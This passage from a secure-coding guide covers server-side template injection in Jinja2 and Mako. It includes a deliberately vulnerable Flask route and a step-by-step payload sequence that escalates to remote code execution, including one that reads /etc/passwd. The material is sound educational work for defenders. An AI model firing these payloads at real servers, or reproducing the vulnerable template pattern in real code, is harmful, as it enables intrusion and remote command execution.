---
source: "languages/python/template-injection.md"
title: "Template Injection (SSTI) — Jinja2, Mako, Django"
heading: "Vulnerable Code Example"
category: "language-vuln"
language: "python"
severity: "critical"
tags: [checklist, code, explanation, language-vuln, prevention, python, secure, vulnerability, vulnerable]
chunk: 4/8
---

## Vulnerable Code Example

### Full Exploit Chain: Jinja2 SSTI to RCE

```python
# 🚫 VULNERABLE — AI-generated Flask app
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/page')
def page():
    content = request.args.get('content', '')
    # Attacker sends: content={{ config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read() }}
    rendered = render_template_string(f"<div>{content}</div>")
    return rendered

# Payload: {{ config.__class__.__init__.__globals__['os'].popen('whoami').read() }}
# Returns: root
```

### Jinja2 SSTI Exploitation Progression

```
# 1. Detection — does server evaluate {{ 7*7 }}?
{{ 7*7 }} → 49  (yes, SSTI confirmed)

# 2. Access config
{{ config }} → <Config {...}>

# 3. Class hierarchy traversal for RCE
{{ ''.__class__.__mro__[1].__subclasses__() }}

# 4. Find subprocess.Popen
{{ ''.__class__.__mro__[1].__subclasses__()[X]('id', shell=True, stdout=-1).communicate() }}
```

### Mako Template RCE

```python
# 🚫 VULNERABLE — Mako template injection
from mako.template import Template

# User input becomes part of template code
user_input = "${__import__('os').popen('id').read()}"
t = Template(f"<div>{user_input}</div>")
print(t.render())  # 💥 Returns UID information

# Mako is MORE dangerous than Jinja2 because:
# - It has NO sandbox
# - Any Python expression is valid
# - ${...} syntax evaluates everything
```

---